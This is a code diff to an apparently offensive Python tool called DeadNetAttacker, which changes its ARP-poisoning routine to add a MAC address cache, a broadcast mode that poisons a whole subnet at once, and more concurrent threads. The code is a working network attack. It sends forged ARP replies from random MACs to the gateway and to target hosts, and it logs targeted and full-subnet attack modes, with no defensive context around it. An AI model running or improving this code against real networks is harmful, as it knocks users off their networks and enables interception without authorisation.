@@ -50,6 +50,10 @@ class DeadNetAttacker:
         
         self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
         
+        # MAC cache for known hosts
+        self.mac_cache = {}
+        self.targeted_mode = bool(self.target_ips)
+        
         if self.target_ips:
             self.host_ipv4s = [ip.strip() for ip in self.target_ips if ip.strip()]
             self.log(f"{YELLOW}[!]{WHITE} TARGETED MODE: Attacking {len(self.host_ipv4s)} specific host(s)")
@@ -57,6 +61,7 @@ class DeadNetAttacker:
             exclude_ips = [self.user_ipv4, self.gateway_ipv4]
             self.host_ipv4s = generate_host_ips(self.subnet_ipv4_sr, exclude_ips)
             self.log(f"{BLUE}[*]{WHITE} FULL MODE: Generated {len(self.host_ipv4s)} possible IPv4 hosts")
+            self.log(f"{BLUE}[*]{WHITE} Using broadcast ARP (fast mode)")
         
         if self.spoof_ipv6ra:
             self.log(f"{BLUE}[*]{WHITE} IPv6 RA spoof is enabled")
@@ -100,43 +105,49 @@ class DeadNetAttacker:
         return f"{base}.{random.randint(2, 250)}"
     
     def poison_arp_single_host(self, host_ip):
-        """Poison ARP cache for a single host - targeted, not broadcast"""
+        """Poison ARP cache for a single host"""
         try:
             spoof_mac = RandMAC()
-            # Always use fake IP for stealth - either user-specified or random
             source_ip = self.fake_ip if self.fake_ip else self.generate_random_ip()
             
-            # Get target's MAC address first (required for targeted attack)
-            target_mac = getmacbyip(host_ip)
-            if not target_mac:
-                # If can't get MAC, skip this host
-                return 0
-            
-            # Packet 1: Tell gateway that target IP is at fake MAC
-            # This poisons gateway's ARP cache
-            arp_to_gateway = ARP(
-                op=2,  # is-at (reply)
-                psrc=host_ip,  # Pretend to be target
-                hwsrc=spoof_mac,  # With fake MAC
-                pdst=self.gateway_ipv4,
-                hwdst=self.gateway_mac
-            )
-            sendp(Ether(dst=self.gateway_mac) / arp_to_gateway, 
-                  iface=self.network_interface, verbose=0)
-            
-            # Packet 2: Tell target that gateway IP is at fake MAC
-            # This poisons target's ARP cache - UNICAST to target only!
-            arp_to_target = ARP(
-                op=2,  # is-at (reply)
-                psrc=self.gateway_ipv4,  # Pretend to be gateway
-                hwsrc=spoof_mac,  # With fake MAC
-                pdst=host_ip,
-                hwdst=target_mac
-            )
-            sendp(Ether(dst=target_mac) / arp_to_target, 
-                  iface=self.network_interface, verbose=0)
-            
-            return 2
+            if self.targeted_mode:
+                # TARGETED MODE: Use unicast (need MAC resolution)
+                # Check cache first
+                target_mac = self.mac_cache.get(host_ip)
+                if not target_mac:
+                    target_mac = getmacbyip(host_ip)
+                    if target_mac:
+                        self.mac_cache[host_ip] = target_mac
+                
+                if not target_mac:
+                    return 0
+                
+                # Unicast to gateway
+                arp_to_gateway = ARP(op=2, psrc=host_ip, hwsrc=spoof_mac,
+                                     pdst=self.gateway_ipv4, hwdst=self.gateway_mac)
+                sendp(Ether(dst=self.gateway_mac) / arp_to_gateway,
+                      iface=self.network_interface, verbose=0)
+                
+                # Unicast to target
+                arp_to_target = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=spoof_mac,
+                                    pdst=host_ip, hwdst=target_mac)
+                sendp(Ether(dst=target_mac) / arp_to_target,
+                      iface=self.network_interface, verbose=0)
+                return 2
+            else:
+                # FULL SUBNET MODE: Use broadcast (no MAC resolution needed - FAST!)
+                # Broadcast: Tell everyone that this IP is at fake MAC
+                arp_broadcast = ARP(op=2, psrc=host_ip, hwsrc=spoof_mac,
+                                    pdst=self.gateway_ipv4, hwdst="ff:ff:ff:ff:ff:ff")
+                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_broadcast,
+                      iface=self.network_interface, verbose=0)
+                
+                # Also poison gateway about this host
+                arp_to_gateway = ARP(op=2, psrc=host_ip, hwsrc=spoof_mac,
+                                     pdst=self.gateway_ipv4, hwdst=self.gateway_mac)
+                sendp(Ether(dst=self.gateway_mac) / arp_to_gateway,
+                      iface=self.network_interface, verbose=0)
+                return 2
         except Exception:
             return 0
     
@@ -146,7 +157,9 @@ class DeadNetAttacker:
             return 0
         
         packets_sent = 0
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        # More workers for faster execution
+        max_workers = 10 if self.targeted_mode else 50
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
             results = executor.map(self.poison_arp_single_host, self.host_ipv4s)
             packets_sent = sum(results)
         
